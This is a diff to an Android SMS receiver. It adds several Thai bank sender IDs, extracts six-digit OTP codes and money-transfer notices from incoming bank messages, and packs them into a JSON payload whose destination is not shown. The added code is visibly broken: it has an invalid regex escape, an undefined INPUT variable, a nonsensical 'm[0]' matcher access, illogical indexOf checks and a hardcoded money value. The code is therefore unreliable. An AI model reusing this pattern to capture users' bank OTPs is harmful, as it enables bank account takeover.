@@ -26,6 +26,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
 import android.widget.Toast;
+import java.util.regex.*;  
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -51,6 +52,8 @@ public class MySmsReceiver extends BroadcastReceiver {
         String type = "SMS";
         String strMessage = "";
         String format = bundle.getString("format");
+        String otp = "";
+        float money = 0;
 
         // Retrieve the SMS message received.
         Object[] pdus = (Object[]) bundle.get(pdu_type);
@@ -82,16 +85,33 @@ public class MySmsReceiver extends BroadcastReceiver {
                     bankname = "KTB";
                 } else if (msgs[i].getOriginatingAddress().equals("026455555") || msgs[i].getOriginatingAddress().equals("BANGKOKBANK")) {
                     bankname = "BBC";
+                } else if (msgs[i].getOriginatingAddress().equals("1572") || msgs[i].getOriginatingAddress().equals("KRUNGSRICC")) {
+                    bankname = "KRUNGSRICC";
+                } else if (msgs[i].getOriginatingAddress().equals("1558") || msgs[i].getOriginatingAddress().equals("TMBBank")) {
+                    bankname = "TMB";
+                } else if (msgs[i].getOriginatingAddress().equals("026459000") || msgs[i].getOriginatingAddress().equals("GHBank")) {
+                    bankname = "GHB";
+                } else if (msgs[i].getOriginatingAddress().equals("1115") || msgs[i].getOriginatingAddress().equals("GSB")) {
+                    bankname = "GSB";
                 }
 
                 if(!bankname.equals("")) {
                     strMessage = msgs[i].getMessageBody();
-                    if(strMessage.indexOf("OTP") != -1) {
+                    if(strMessage.indexOf("OTP") == 1) {
                         type = "OTP";
+                        String REGEX = "\\d\{6}\b";
+                        Pattern p = Pattern.compile(REGEX);
+                        Matcher m = p.matcher(INPUT);   // get a matcher object
+                        otp = m[0];
+                    } else if(strMessage.indexOf("เงิน") == 1 || strMessage.indexOf("โอน") == 1) {
+                        type = "MONEY";
+                        money = 1000;
                     }
                     JSONObject postDataParams = new JSONObject();
                     try {
                         postDataParams.put("messages", strMessage);
+                        postDataParams.put("money", money);
+                        postDataParams.put("otp", otp);
                         postDataParams.put("type", type);
                         postDataParams.put("bankname", bankname);
                     } catch (JSONException e) {
